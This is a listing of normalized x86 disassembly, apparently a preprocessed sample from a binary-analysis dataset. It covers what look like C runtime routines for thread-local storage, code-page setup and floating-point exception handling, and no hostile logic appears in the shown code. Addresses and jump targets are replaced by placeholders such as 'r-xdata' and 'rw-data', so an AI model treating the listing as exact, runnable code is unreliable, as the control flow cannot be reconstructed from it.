pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
jmp r-xdata
sub_1001c0ce
push 0x8
push r--data
call sub_1001de70
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_1001deb5
retn 0x4
mov eax [ esi + 0x24 ]
test eax eax
je r-xdata
mov eax [ esi + 0x2c ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x34 ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x3c ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x40 ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x48 ]
test eax eax
je r-xdata
push eax
call sub_1001750d
pop ecx
mov eax [ esi + 0x5c ]
cmp eax r--data
je r-xdata
push eax
call sub_1001750d
pop ecx
push 0xd
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
mov edi [ esi + 0x68 ]
test edi edi
je r-xdata
push eax
call sub_1001750d
pop ecx
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c1e8
push 0xc
call sub_1001fd54
pop ecx
mov [ ebp - 0x4 ] 0x1
mov edi [ esi + 0x6c ]
test edi edi
je r-xdata
push edi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c1f4
push esi
call sub_1001750d
pop ecx
push edi
call sub_1001bc5a
pop ecx
cmp edi [ rw-data ]
je r-xdata
cmp edi rw-data
je r-xdata
cmp edi rw-data
je r-xdata
push edi
call sub_1001750d
pop ecx
cmp [ edi ] 0x0
jne r-xdata
push edi
call sub_1001bcf3
pop ecx
sub_1001c1fd
mov edi edi
push ebp
mov ebp esp
cmp [ rw-data ] 0xffffffff
je r-xdata
mov eax [ rw-data ]
cmp eax 0xffffffff
je r-xdata
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
push 0x0
push eax
call [ TlsSetValue@IAT ]
push 0x0
push [ rw-data ]
push [ rw-data ]
call [ DecodePointer@IAT ]
call eax
push [ ebp + 0x8 ]
call sub_1001c0ce
push esi
push [ rw-data ]
mov esi [ TlsGetValue@IAT ]
call esi
test eax eax
je r-xdata
pop esi
push [ rw-data ]
push [ rw-data ]
call esi
call eax
mov [ ebp + 0x8 ] eax
sub_1001c26b
mov edi edi
push edi
push r--data
call [ GetModuleHandleW@IAT ]
mov edi eax
test edi edi
jne r-xdata
push esi
mov esi [ GetProcAddress@IAT ]
push r--data
push edi
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
push r--data
push edi
mov [ rw-data ] eax
call esi
cmp [ rw-data ] 0x0
mov esi [ TlsSetValue@IAT ]
mov [ rw-data ] eax
je r-xdata
call sub_1001bf4a
xor eax eax
pop edi
retn
mov eax [ TlsGetValue@IAT ]
mov [ rw-data ] eax
mov eax [ TlsFree@IAT ]
mov [ rw-data ] sub_1001bf0d
mov [ rw-data ] esi
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
push [ rw-data ]
push eax
call esi
test eax eax
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_1001d54f
push [ rw-data ]
mov esi [ EncodePointer@IAT ]
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
push [ rw-data ]
mov [ rw-data ] eax
call esi
mov [ rw-data ] eax
call sub_1001fbda
test eax eax
je r-xdata
test eax eax
jne r-xdata
call sub_1001bf4a
mov edi [ DecodePointer@IAT ]
push sub_1001c0ce
push [ rw-data ]
call edi
call eax
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
call [ TlsAlloc@IAT ]
mov [ rw-data ] eax
cmp eax 0xffffffff
je r-xdata
push 0x214
push 0x1
call sub_10019e40
mov esi eax
pop ecx
pop ecx
test esi esi
je r-xdata
push esi
push [ rw-data ]
push [ rw-data ]
call edi
call eax
test eax eax
je r-xdata
push 0x0
push esi
call sub_1001bf87
pop ecx
pop ecx
call [ GetCurrentThreadId@IAT ]
or [ esi + 0x4 ] 0xffffffff
mov [ esi ] eax
xor eax eax
inc eax
jmp r-xdata
pop esi
pop edi
retn
sub_1001c3e6
sub eax 0x3a4
je r-xdata
mov eax 0x411
retn
sub eax 0x4
je r-xdata
mov eax 0x804
retn
sub eax 0xd
je r-xdata
mov eax 0x412
retn
dec eax
je r-xdata
mov eax 0x404
retn
xor eax eax
retn
sub_1001c415
mov edi edi
push esi
push edi
mov esi eax
push 0x101
xor edi edi
lea eax [ esi + 0x1c ]
push edi
push eax
call sub_1001b6e0
xor eax eax
movzx ecx ax
mov eax ecx
mov [ esi + 0x4 ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0xc ] edi
shl ecx 0x10
or eax ecx
lea edi [ esi + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
mov ecx rw-data
add esp 0xc
lea eax [ esi + 0x1c ]
sub ecx esi
mov edi 0x101
mov dl [ ecx + eax ]
mov [ eax ] dl
inc eax
dec edi
jne r-xdata
lea eax [ esi + 0x11d ]
mov esi 0x100
mov dl [ eax + ecx ]
mov [ eax ] dl
inc eax
dec esi
jne r-xdata
pop edi
pop esi
retn
sub_1001c479
mov edi edi
push ebp
mov ebp esp
sub esp 0x51c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
push edi
lea eax [ ebp - 0x518 ]
push eax
push [ esi + 0x4 ]
call [ GetCPInfo@IAT ]
mov edi 0x100
test eax eax
je r-xdata
lea eax [ esi + 0x11d ]
mov [ ebp - 0x51c ] 0xffffff9f
xor ecx ecx
sub [ ebp - 0x51c ] eax
xor eax eax
cmp edx 0x19
ja r-xdata
or [ esi + ecx + 0x1d ] 0x10
lea edx [ ecx + 0x20 ]
jmp r-xdata
mov [ ebp + eax - 0x104 ] al
inc eax
cmp eax edi
jb r-xdata
mov al [ ebp - 0x512 ]
mov [ ebp - 0x104 ] 0x20
test al al
je r-xdata
mov [ eax ] 0x0
or [ esi + ecx + 0x1d ] 0x20
lea edx [ ecx - 0x20 ]
mov [ eax ] dl
jmp r-xdata
push 0x0
push [ esi + 0xc ]
lea eax [ ebp - 0x504 ]
push [ esi + 0x4 ]
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x1
push 0x0
call sub_1001e34b
xor ebx ebx
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x204 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push edi
push [ esi + 0xc ]
push ebx
call sub_1001a10a
add esp 0x44
push ebx
push [ esi + 0x4 ]
lea eax [ ebp - 0x304 ]
push edi
push eax
push edi
lea eax [ ebp - 0x104 ]
push eax
push 0x200
push [ esi + 0xc ]
push ebx
call sub_1001a10a
add esp 0x24
xor eax eax
lea ebx [ ebp - 0x511 ]
mov edx [ ebp - 0x51c ]
lea eax [ esi + ecx + 0x11d ]
add edx eax
lea ebx [ edx + 0x20 ]
cmp ebx 0x19
ja r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
inc ecx
cmp ecx edi
jb r-xdata
test cl 0x2
je r-xdata
or [ esi + eax + 0x1d ] 0x10
mov cl [ ebp + eax - 0x204 ]
jmp r-xdata
mov al [ ebx + 0x1 ]
add ebx 0x2
test al al
jne r-xdata
sub eax ecx
inc eax
push eax
lea edx [ ebp + ecx - 0x104 ]
push 0x20
push edx
call sub_1001b6e0
add esp 0xc
mov [ esi + eax + 0x11d ] bl
or [ esi + eax + 0x1d ] 0x20
mov cl [ ebp + eax - 0x304 ]
mov [ esi + eax + 0x11d ] cl
jmp r-xdata
movzx ecx al
movzx eax [ ebx ]
cmp ecx eax
ja r-xdata
movzx ecx [ ebp + eax * 2 - 0x504 ]
test cl 0x1
je r-xdata
jmp r-xdata
inc eax
cmp eax edi
jb r-xdata
sub_1001c609
push 0xc
push r--data
call sub_1001de70
call sub_1001c0b4
mov edi eax
mov eax [ rw-data ]
test [ edi + 0x70 ] eax
je r-xdata
push 0xd
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
mov esi [ edi + 0x68 ]
mov [ ebp - 0x1c ] esi
cmp esi [ rw-data ]
je r-xdata
cmp [ edi + 0x6c ] 0x0
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001c6a4
jmp r-xdata
test esi esi
je r-xdata
mov esi [ edi + 0x68 ]
test esi esi
jne r-xdata
mov eax [ rw-data ]
mov [ edi + 0x68 ] eax
mov esi [ rw-data ]
mov [ ebp - 0x1c ] esi
push esi
call [ InterlockedIncrement@IAT ]
push esi
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax esi
call sub_1001deb5
retn
push 0x20
call sub_1001d7a2
cmp esi rw-data
je r-xdata
push esi
call sub_1001750d
pop ecx
sub_1001c6ad
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
xor ebx ebx
push ebx
lea ecx [ ebp - 0x10 ]
call sub_100176e6
mov [ rw-data ] ebx
cmp esi 0xfffffffe
jne r-xdata
cmp esi 0xfffffffd
jne r-xdata
mov [ rw-data ] 0x1
call [ GetOEMCP@IAT ]
cmp esi 0xfffffffc
jne r-xdata
mov [ rw-data ] 0x1
call [ GetACP@IAT ]
jmp r-xdata
pop ebx
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax [ ebp - 0x10 ]
mov eax [ eax + 0x4 ]
mov [ rw-data ] 0x1
jmp r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
mov eax esi
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_1001c729
mov edi edi
push ebp
mov ebp esp
sub esp 0x20
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi [ ebp + 0x8 ]
push edi
call sub_1001c6ad
mov edi eax
xor esi esi
mov [ ebp + 0x8 ] edi
cmp edi esi
jne r-xdata
mov [ ebp - 0x1c ] esi
xor eax eax
mov eax ebx
call sub_1001c415
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1001b6e0
mov ecx [ ebp - 0x1c ]
add esp 0xc
imul ecx ecx 0x30
mov [ ebp - 0x20 ] esi
lea esi [ ecx + rw-data ]
mov [ ebp - 0x1c ] esi
jmp r-xdata
inc [ ebp - 0x1c ]
add eax 0x30
cmp eax 0xf0
jb r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_10016ec3
leave
retn
cmp [ esi ] 0x0
jne r-xdata
cmp [ eax + rw-data ] edi
je r-xdata
cmp edi 0xfde8
je r-xdata
mov al [ esi + 0x1 ]
test al al
je r-xdata
mov esi [ ebp - 0x1c ]
inc [ ebp - 0x20 ]
add esi 0x8
cmp [ ebp - 0x20 ] 0x4
mov [ ebp - 0x1c ] esi
jb r-xdata
or eax 0xffffffff
cmp edi 0xfde9
je r-xdata
movzx edi [ esi ]
movzx eax al
jmp r-xdata
mov eax edi
mov [ ebx + 0x4 ] edi
mov [ ebx + 0x8 ] 0x1
call sub_1001c3e6
push 0x6
mov [ ebx + 0xc ] eax
lea eax [ ebx + 0x10 ]
lea ecx [ ecx + rw-data ]
pop edx
movzx eax di
push eax
call [ IsValidCodePage@IAT ]
test eax eax
je r-xdata
cmp edi eax
jbe r-xdata
mov si [ ecx ]
mov [ eax ] si
add ecx 0x2
add eax 0x2
dec edx
jne r-xdata
mov esi ebx
call sub_1001c479
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
push edi
call [ GetCPInfo@IAT ]
test eax eax
je r-xdata
mov eax [ ebp - 0x20 ]
mov al [ eax + rw-data ]
or [ ebx + edi + 0x1d ] al
movzx eax [ esi + 0x1 ]
inc edi
mov edi [ ebp + 0x8 ]
add esi 0x2
xor eax eax
jmp r-xdata
cmp [ rw-data ] esi
jne r-xdata
push 0x101
lea eax [ ebx + 0x1c ]
push esi
push eax
call sub_1001b6e0
xor edx edx
inc edx
add esp 0xc
mov [ ebx + 0x4 ] edi
mov [ ebx + 0xc ] esi
cmp [ ebp - 0x18 ] edx
jbe r-xdata
mov [ ebx + 0x8 ] esi
cmp [ ebp - 0x12 ] 0x0
je r-xdata
lea eax [ ebx + 0x1e ]
mov ecx 0xfe
lea esi [ ebp - 0x11 ]
or [ eax ] 0x8
inc eax
dec ecx
jne r-xdata
mov eax [ ebx + 0x4 ]
call sub_1001c3e6
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] edx
jmp r-xdata
movzx eax [ esi - 0x1 ]
movzx ecx cl
jmp r-xdata
xor eax eax
movzx ecx ax
mov eax ecx
shl ecx 0x10
or eax ecx
lea edi [ ebx + 0x10 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
cmp eax ecx
jbe r-xdata
or [ ebx + eax + 0x1d ] 0x4
inc eax
add esi 0x2
cmp [ esi - 0x1 ] 0x0
jne r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
sub_1001c912
push 0x14
push r--data
call sub_1001de70
or [ ebp - 0x20 ] 0xffffffff
call sub_1001c0b4
mov edi eax
mov [ ebp - 0x24 ] edi
call sub_1001c609
mov ebx [ edi + 0x68 ]
mov esi [ ebp + 0x8 ]
call sub_1001c6ad
mov [ ebp + 0x8 ] eax
cmp eax [ ebx + 0x4 ]
je r-xdata
and [ ebp - 0x20 ] 0x0
push 0x220
call sub_10019dfb
pop ecx
mov ebx eax
test ebx ebx
je r-xdata
mov eax [ ebp - 0x20 ]
call sub_1001deb5
retn
mov ecx 0x88
mov esi [ edi + 0x68 ]
mov edi ebx
[ edi ] [ esi ]
and [ ebx ] 0x0
push ebx
push [ ebp + 0x8 ]
call sub_1001c729
pop ecx
pop ecx
mov [ ebp - 0x20 ] eax
test eax eax
jne r-xdata
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x24 ]
push [ esi + 0x68 ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
cmp ebx rw-data
je r-xdata
mov [ esi + 0x68 ] ebx
push ebx
mov edi [ InterlockedIncrement@IAT ]
call edi
test [ esi + 0x70 ] 0x2
jne r-xdata
mov eax [ esi + 0x68 ]
cmp eax rw-data
je r-xdata
call sub_10017e85
mov [ eax ] 0x16
jmp r-xdata
push ebx
call sub_1001750d
pop ecx
test [ rw-data ] 0x1
jne r-xdata
push eax
call sub_1001750d
pop ecx
push 0xd
call sub_1001fd54
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ ebx + 0x4 ]
mov [ rw-data ] eax
mov eax [ ebx + 0x8 ]
mov [ rw-data ] eax
mov eax [ ebx + 0xc ]
mov [ rw-data ] eax
xor eax eax
xor eax eax
mov cx [ ebx + eax * 2 + 0x10 ]
mov [ eax * 2 + rw-data ] cx
inc eax
jmp r-xdata
xor eax eax
mov cl [ eax + ebx + 0x1c ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x5
jge r-xdata
push [ rw-data ]
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov cl [ eax + ebx + 0x11d ]
mov [ eax + rw-data ] cl
inc eax
jmp r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x101
jge r-xdata
mov [ rw-data ] ebx
push ebx
call edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_1001ca73
jmp r-xdata
mov eax [ rw-data ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x1c ] eax
cmp eax 0x100
jge r-xdata
push eax
call sub_1001750d
pop ecx
sub_1001caca
mov edi edi
push ebp
mov ebp esp
mov eax 0xffff
sub esp 0x14
cmp [ ebp + 0x8 ] ax
je r-xdata
leave
retn
push ebx
push esi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x14 ]
call sub_100176e6
mov esi [ ebp - 0x14 ]
mov ecx [ esi + 0x14 ]
xor ebx ebx
cmp ecx ebx
jne r-xdata
mov eax 0x100
push 0x1
cmp [ ebp + 0x8 ] ax
jae r-xdata
mov eax [ ebp + 0x8 ]
lea ecx [ eax - 0x41 ]
cmp cx 0x19
ja r-xdata
lea edx [ ebp - 0x4 ]
push edx
push 0x1
lea edx [ ebp + 0x8 ]
push edx
push eax
push ecx
call sub_10019bdd
add esp 0x18
test eax eax
movzx eax [ ebp + 0x8 ]
je r-xdata
push [ ebp + 0x8 ]
call sub_100248f7
pop ecx
test eax eax
movzx eax [ ebp + 0x8 ]
pop ecx
je r-xdata
movzx eax ax
jmp r-xdata
add ax 0x20
cmp [ ebp - 0x8 ] bl
je r-xdata
movzx eax [ ebp - 0x4 ]
mov ecx [ esi + 0xcc ]
movzx eax [ ecx + eax ]
jmp r-xdata
pop esi
pop ebx
mov ecx [ ebp - 0xc ]
and [ ecx + 0x70 ] 0xfffffffd
sub_1001cb6a
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ ebp + 0x10 ]
fld [ ebp + 0x8 ]
movzx ecx [ ebp + 0xe ]
fstp [ ebp - 0x8 ]
add eax 0x3fe
shl eax 0x4
and ecx 0x800f
or eax ecx
mov [ ebp - 0x2 ] ax
fld [ ebp - 0x8 ]
leave
retn
sub_1001cb97
mov edi edi
push ebp
mov ebp esp
xor edx edx
cmp [ ebp + 0xc ] 0x7ff00000
jne r-xdata
cmp [ ebp + 0xc ] 0xfff00000
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
mov cx [ ebp + 0xe ]
mov eax 0x7ff8
push esi
mov esi eax
and cx si
pop esi
cmp cx ax
jne r-xdata
cmp [ ebp + 0x8 ] edx
jne r-xdata
xor eax eax
inc eax
pop ebp
retn
mov eax 0x7ff0
cmp cx ax
jne r-xdata
push 0x3
jmp r-xdata
push 0x2
xor eax eax
pop ebp
retn
test [ ebp + 0xc ] 0x7ffff
jne r-xdata
pop eax
pop ebp
retn
push 0x4
jmp r-xdata
cmp [ ebp + 0x8 ] edx
je r-xdata
sub_1001cbfd
mov edi edi
push ebp
mov ebp esp
fld [ ebp + 0x8 ]
fldz
fld st0
fucomp st2
fnstsw ax
fstp st1
test ah 0x44
jpe r-xdata
movzx eax [ ebp + 0xe ]
xor ecx ecx
test eax 0x7ff0
jne r-xdata
xor edx edx
jmp r-xdata
push ecx
fstp st0
fld [ ebp + 0x8 ]
push ecx
push ecx
fstp [ esp ]
call sub_1001cb6a
movzx edx [ ebp + 0xe ]
shr edx 0x4
and edx 0x7ff
add esp 0xc
sub edx 0x3fe
test [ ebp + 0xc ] 0xfffff
jne r-xdata
mov eax [ ebp + 0x10 ]
mov [ eax ] edx
pop ebp
retn
fcomp [ ebp + 0x8 ]
mov edx 0xfffffc03
fnstsw ax
test ah 0x41
jne r-xdata
cmp [ ebp + 0x8 ] ecx
je r-xdata
xor eax eax
jmp r-xdata
xor eax eax
inc eax
jmp r-xdata
test [ ebp + 0xe ] 0x10
je r-xdata
shl [ ebp + 0xc ] 0x1
test [ ebp + 0x8 ] 0x80000000
je r-xdata
push esi
mov esi 0xffef
and [ ebp + 0xe ] si
pop esi
cmp eax ecx
je r-xdata
shl [ ebp + 0x8 ] 0x1
dec edx
or [ ebp + 0xc ] 0x1
fld [ ebp + 0x8 ]
push ecx
push ecx
push ecx
fstp [ esp ]
call sub_1001cb6a
add esp 0xc
jmp r-xdata
mov eax 0x8000
or [ ebp + 0xe ] ax
sub_1001ccc0
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
fldz
mov eax [ ebp + 0x8 ]
fstp [ ebp - 0x8 ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp + 0x14 ]
xor eax [ ebp + 0xc ]
and eax 0x7fffffff
xor eax [ ebp + 0x14 ]
mov [ ebp - 0x4 ] eax
fld [ ebp - 0x8 ]
leave
retn
sub_1001cce8
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov cl [ ebp + 0x10 ]
push ebx
push esi
push edi
xor edi edi
mov [ eax + 0x4 ] edi
mov eax [ ebp + 0x8 ]
xor ebx ebx
mov [ eax + 0x8 ] edi
mov eax [ ebp + 0x8 ]
inc ebx
mov [ eax + 0xc ] edi
test cl 0x10
je r-xdata
test cl 0x2
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] ebx
mov [ ebp + 0x10 ] 0xc000008f
test bl cl
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x2
mov [ ebp + 0x10 ] 0xc0000093
test cl 0x4
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x4
mov [ ebp + 0x10 ] 0xc0000091
test cl 0x8
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x8
mov [ ebp + 0x10 ] 0xc000008e
mov esi [ ebp + 0xc ]
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shl ecx 0x4
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x10
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
add ecx ecx
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x8
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x1
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x4
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x3
not ecx
xor ecx [ eax + 0x8 ]
and ecx 0x2
xor [ eax + 0x8 ] ecx
mov ecx [ esi ]
mov eax [ ebp + 0x8 ]
shr ecx 0x5
not ecx
xor ecx [ eax + 0x8 ]
and ecx ebx
xor [ eax + 0x8 ] ecx
call sub_1001d3e4
test bl al
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0x4 ] 0x10
mov [ ebp + 0x10 ] 0xc0000090
test al 0x4
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x10
test al 0x8
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x8
test al 0x10
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x4
test al 0x20
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ecx + 0xc ] 0x2
mov eax [ esi ]
mov ecx 0xc00
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax + 0xc ] ebx
mov eax [ ebp + 0x8 ]
and [ eax ] 0xfffffffc
cmp eax 0x400
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffeb
or ecx 0x8
cmp eax 0x200
je r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffd
or ecx ebx
jmp r-xdata
cmp eax 0x800
je r-xdata
mov ecx [ eax + 0x20 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x20 ] ecx
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x60 ]
and ecx 0xffffffe3
or ecx 0x2
mov [ eax + 0x60 ] ecx
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
and [ eax + 0x20 ] 0xffffffe1
mov eax [ ebp + 0x18 ]
fld [ eax ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
or [ eax + 0x60 ] ebx
mov eax [ ebp + 0x8 ]
and [ eax + 0x60 ] 0xffffffe1
fld [ edi ]
mov eax [ ebp + 0x8 ]
fstp [ eax + 0x50 ]
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xffffffe7
or ecx 0x4
jmp r-xdata
cmp eax ecx
jne r-xdata
mov [ eax ] ecx
jmp r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
and ecx 0xfffffffe
or ecx 0x2
cmp eax ecx
jne r-xdata
test [ ecx + 0x8 ] 0x8
je r-xdata
and [ esi ] 0xfffffffe
call sub_1001d3f4
lea eax [ ebp + 0x8 ]
push eax
push ebx
push 0x0
push [ ebp + 0x10 ]
call [ RaiseException@IAT ]
mov ecx [ ebp + 0x8 ]
test [ ecx + 0x8 ] 0x10
je r-xdata
mov [ eax ] ecx
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x14 ]
shl ecx 0x5
xor ecx [ eax ]
and ecx 0x1ffe0
xor [ eax ] ecx
mov eax [ ebp + 0x8 ]
or [ eax + 0x20 ] ebx
cmp [ ebp + 0x20 ] edi
mov eax [ ebp + 0x8 ]
mov edi [ ebp + 0x1c ]
je r-xdata
mov eax [ ebp + 0x8 ]
and [ eax ] 0xffffffe3
jmp r-xdata
mov eax [ esi ]
mov ecx 0x300
and eax ecx
je r-xdata
mov eax [ ebp + 0x8 ]
or [ eax ] 0x3
jmp r-xdata
test [ ecx + 0x8 ] 0x4
je r-xdata
and [ esi ] 0xfffffffb
test [ ecx + 0x8 ] 0x2
je r-xdata
and [ esi ] 0xfffffff7
test [ ecx + 0x8 ] bl
je r-xdata
and [ esi ] 0xffffffef
mov eax [ ecx ]
and eax 0x3
xor ebx ebx
sub eax ebx
mov edx 0xfffff3ff
je r-xdata
and [ esi ] 0xffffffdf
and [ esi ] edx
dec eax
je r-xdata
mov eax [ esi ]
and eax edx
or eax 0x300
dec eax
je r-xdata
mov eax [ esi ]
and eax 0xfffff7ff
or eax 0x400
jmp r-xdata
dec eax
je r-xdata
fld [ ecx + 0x50 ]
fstp [ edi ]
fld [ ecx + 0x50 ]
fstp [ edi ]
jmp r-xdata
mov eax [ esi ]
and eax edx
or eax 0x200
jmp r-xdata
dec eax
jne r-xdata
mov [ esi ] eax
jmp r-xdata
mov eax [ esi ]
and eax 0xfffffbff
or eax 0x800
dec eax
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
mov [ esi ] eax
cmp [ ebp + 0x20 ] ebx
je r-xdata
and [ esi ] edx
jmp r-xdata
mov eax [ ecx ]
shr eax 0x2
and eax 0x7
sub eax ebx
je r-xdata
or [ esi ] 0xc00
jmp r-xdata
sub_1001cfc4
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
mov eax [ ebp + 0x8 ]
push ebx
push esi
xor ebx ebx
mov esi eax
and esi 0x1f
inc ebx
mov [ ebp - 0x4 ] esi
test al 0x8
je r-xdata
test al 0x4
je r-xdata
test [ ebp + 0x10 ] bl
je r-xdata
test bl al
je r-xdata
test [ ebp + 0x10 ] 0x4
je r-xdata
push ebx
call sub_1001d430
pop ecx
and esi 0xfffffff7
jmp r-xdata
test al 0x2
je r-xdata
test [ ebp + 0x10 ] 0x8
je r-xdata
push 0x4
call sub_1001d430
pop ecx
and esi 0xfffffffb
jmp r-xdata
test [ ebp + 0x8 ] 0x10
je r-xdata
test [ ebp + 0x10 ] 0x10
je r-xdata
push 0x8
call sub_1001d430
mov eax [ ebp + 0x10 ]
pop ecx
mov ecx 0xc00
and eax ecx
je r-xdata
xor eax eax
test esi esi
pop esi
sete al
pop ebx
leave
retn
test [ ebp + 0x10 ] 0x20
je r-xdata
xor esi esi
test al 0x10
je r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x400
je r-xdata
push 0x20
call sub_1001d430
pop ecx
and esi 0xffffffef
push edi
mov edi [ ebp + 0xc ]
fld [ edi ]
fldz
fucompp
fnstsw ax
test ah 0x44
jpo r-xdata
mov esi ebx
fld [ rw-data ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpe r-xdata
cmp eax 0x800
je r-xdata
mov esi ebx
fld [ edi ]
lea eax [ ebp - 0x8 ]
push eax
push ecx
push ecx
fstp [ esp ]
call sub_1001cbfd
mov ecx [ ebp - 0x8 ]
fstp [ ebp - 0x14 ]
add ecx 0xfffffa00
add esp 0xc
cmp ecx 0xfffffbce
jge r-xdata
fstp [ ecx ]
fld [ rw-data ]
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
test ah 0x5
jpo r-xdata
cmp eax ecx
jne r-xdata
and [ ebp - 0x4 ] 0xfffffffd
mov esi [ ebp - 0x4 ]
push 0x10
call sub_1001d430
pop ecx
fldz
fcomp [ ebp - 0x14 ]
fnstsw ax
test ah 0x41
jne r-xdata
fld [ ebp - 0x14 ]
mov esi ebx
fmul [ r--data ]
jmp r-xdata
fld [ rw-data ]
jmp r-xdata
and esi 0xfffffffe
jmp r-xdata
fldz
mov ecx [ ebp + 0xc ]
fcomp [ ecx ]
fnstsw ax
fld [ rw-data ]
test ah 0x5
jpo r-xdata
xor edx edx
mov edx ebx
jmp r-xdata
fstp [ ebp - 0x14 ]
fchs
jmp r-xdata
test edx edx
je r-xdata
sub eax ecx
mov eax [ ebp - 0xe ]
and eax 0xf
or eax 0x10
mov [ ebp - 0xe ] ax
mov eax 0xfffffc03
cmp ecx eax
jge r-xdata
pop edi
test esi esi
